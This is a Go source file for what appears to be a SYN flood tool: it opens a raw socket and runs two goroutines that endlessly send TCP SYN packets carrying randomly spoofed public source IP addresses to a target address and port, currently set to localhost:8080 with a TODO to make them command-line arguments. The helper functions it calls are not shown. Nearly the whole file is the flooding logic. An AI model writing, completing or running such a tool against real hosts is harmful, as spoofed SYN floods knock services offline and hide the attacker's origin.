package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"syscall"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {

	// TODO make dst ip and port as args/flags
	dstIp := net.ParseIP("127.0.0.1")
	dstPort := 8080

	rawSocket, err := NewRawSocket(dstIp)
	if err != nil {
		log.Fatalf("new raw socket: %v", err)
	}

	for i := 0; i < 2; i++ {
		go func() {
			for {
				if err := SendSYN(rawSocket, dstIp, uint16(dstPort)); err != nil {
					log.Printf("send SYN: %v", err)
				}
			}
		}()
	}
	time.Sleep(5 * time.Second) // TODO ---
}

func SendSYN(rawSocket RawSocket, dstIp net.IP, dstPort uint16) error {

	srcIp := GetRandPublicIP()
	tcpHeaderBytes, err := GetTCPSYNHeaderBytes(srcIp, dstIp, dstPort)
	if err != nil {
		return fmt.Errorf("get TCP header: %w", err)
	}

	ipv4Header := GetIPV4Header(srcIp, dstIp, len(tcpHeaderBytes), syscall.IPPROTO_TCP)
	ipv4HeaderBytes, _ := ipv4Header.Marshal()

	data := append(ipv4HeaderBytes, tcpHeaderBytes...)

	if err := rawSocket.Send(data); err != nil {
		return fmt.Errorf("send data to: %w", err)
	}
	return nil
}
